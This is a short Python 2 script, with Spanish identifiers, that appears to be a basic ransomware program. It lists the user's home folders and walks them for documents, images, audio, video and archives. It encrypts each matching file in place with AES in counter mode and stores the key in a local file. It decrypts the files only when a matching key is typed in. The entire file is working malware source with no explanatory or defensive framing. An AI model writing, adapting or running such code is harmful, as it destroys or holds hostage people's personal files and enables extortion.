#!/usr/bin/env python
#_*_ coding: utf8 _*_

import os 
import socket  
import random
import hashlib
from  Crypto.Util import Counter 
from  Crypto.Cipher import AES 

home = os.environ["HOME"]
carpetas = os.listdir(home)
carpetas = [x for x in carpetas if not x.startswith(".")]

extenciones = [".txt",".jpeg",".mp3",".mp4",".avi",".zip",".dat",".rar",".png",".jpg"]

def check_internet():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(2)
	try:
		s.connect(('socket.io',80))
		s.close()
	except:
		exit()

def get_hash():
	hashcomputer = os.environ["HOME"] + os.environ["USER"] + socket.gethostname() + str(random.randint(0,10000000000000000000000000000000000000000000000000000000))
	hashcomputer = hashlib.sha512(hashcomputer)
	hashcomputer = hashcomputer.hexdigest()
	
	new_key = []
	for k in hashcomputer:
		if len (new_key) == 32:
			hashcomputer = "".join(new_key)
			break
		else:
			new_key.append(k)
	return hashcomputer

def encrypt_and_descrypt(archivo,crypto,block_size=16):
	with open(archivo,"r+b") as archivo_enc:
		contenido_no_cifrado= archivo_enc.read(block_size)
		while  contenido_no_cifrado:
			contenido_cifrado =crypto(contenido_no_cifrado)
			if len(contenido_no_cifrado) != len (contenido_cifrado):
				raise valueErrror("")
			archivo_enc.seek(-len(contenido_no_cifrado),1)
			archivo_enc.write(contenido_cifrado)
			contenido_no_cifrado = archivo_enc.read(block_size)

def discover(key):
	file_list = open("file_list",'w+')
	for carpeta in carpetas:
		ruta = home+"/"+carpeta
		for extencion in extenciones:
			for rutabs, directorio, archivo in os.walk(ruta):
				for file in archivo :
					if file.endswith(extencion):
						file_list.write(os.path.join(rutabs, file)+"\n")
	file_list.close()

	lista = open("file_list","r")
	lista = lista.read().split("\n")
	lista = [l for l in lista if not l == ""]

	if os.path.exists("key_file"):
		key1 = raw_input("key: ")
		key_file = open("key_file","r")
		key = key_file.read().split("\n")
		key = "".join(key)
		
		if key1 == key:
			c = Counter.new(128)
			crypto = AES.new(key, AES.MODE_CTR, counter=c)
			cryptarchives = crypto.decrypt
			for element in lista:
				encrypt_and_descrypt(element,cryptarchives)
	else:
		c = Counter.new(128)
		crypto = AES.new(key, AES.MODE_CTR, counter=c)
		key_file = open("key_file","w+")
		key_file.write(key)
		key_file.close()
		cryptarchives = crypto.encrypt

		for  element in lista:
			encrypt_and_descrypt(element,cryptarchives)

def main ():
	hashcomputer = get_hash()
	check_internet()
	discover(hashcomputer)
	

if __name__== "__main__":
		try:
			main()
		except KeyboardInterrupt:
			exit()